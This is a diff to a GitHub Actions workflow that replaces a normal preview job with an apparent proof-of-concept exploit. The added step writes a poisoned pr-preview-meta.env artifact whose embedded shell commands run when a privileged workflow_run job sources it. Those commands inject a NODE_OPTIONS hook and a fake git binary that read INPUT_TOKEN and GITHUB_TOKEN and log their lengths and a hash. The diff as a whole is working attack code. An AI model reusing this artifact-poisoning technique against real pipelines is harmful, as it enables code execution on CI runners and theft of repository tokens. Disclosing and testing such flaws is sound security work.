@@ -12,17 +12,39 @@ jobs:
       pull-requests: read
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - name: Craft attacker-controlled preview artifact
+        run: |
+          set -euxo pipefail
+          mkdir -p payload
+          cat > payload/pr-preview-meta.env <<'META'
+          WORKER_ACTION=deploy
+          PR_NUMBER=1
+          TARGET_REPO=PDFtoMark/gab-poc-prpreview2
+          TARGET_BRANCH=main
+          PAGES_BASE_URL=
+          COMMENT_HEADER=pr-preview
+          echo "PWNED_RCE: attacker-controlled pr-preview-meta.env was sourced as shell in the privileged workflow_run job" >> "$GITHUB_STEP_SUMMARY" || true
+          echo "PWNED_RCE uid=$(id -u) user=$(id -un) event=${GITHUB_EVENT_NAME:-?} repo=${GITHUB_REPOSITORY:-?} workflow=${GITHUB_WORKFLOW:-?}" >> "$GITHUB_STEP_SUMMARY" || true
+          cat > /tmp/gab-hook.js <<'JS'
+          try {
+            const fs = require('fs');
+            const crypto = require('crypto');
+            const t = process.env.INPUT_TOKEN || process.env.GITHUB_TOKEN || '';
+            const h = t ? crypto.createHash('sha256').update(t).digest('hex').slice(0, 16) : 'none';
+            fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/gab-sum.txt',
+              'NODE_OPTIONS hook ran: action=' + (process.env.GITHUB_ACTION || '?') +
+              ' token_len=' + t.length + ' token_sha256_16=' + h + '\n');
+          } catch (e) {}
+          JS
+          echo "NODE_OPTIONS=--require /tmp/gab-hook.js" >> "$GITHUB_ENV" || true
+          mkdir -p /tmp/gab-bin
+          printf '%s\n' '#!/usr/bin/env bash' 'echo "fake-git hook: INPUT_TOKEN_LEN=${#INPUT_TOKEN} GITHUB_TOKEN_LEN=${#GITHUB_TOKEN}" >> "$GITHUB_STEP_SUMMARY"' 'exec /usr/bin/git "$@"' > /tmp/gab-bin/git || true
+          chmod +x /tmp/gab-bin/git || true
+          echo "/tmp/gab-bin" >> "$GITHUB_PATH" || true
+          META
+          ls -l payload
+      - uses: actions/upload-artifact@v4
         with:
-          persist-credentials: false
-      - name: Base preview build
-        run: echo "base PR Preview run"
-      - name: PR preview
-        uses: open-resource-discovery/pr-preview-action@main
-        with:
-          fork: true
-          build-dir: website/build
-          target-repo: PDFtoMark/gab-poc-prpreview-worker
-          pages-base-url: https://pdftomark.github.io/gab-poc-prpreview-worker
-          umbrella-dir: csn-interop-renderer
-          token: ${{ secrets.PR_PREVIEW_TOKEN }}
+          name: pr-preview
+          path: payload
+          if-no-files-found: error
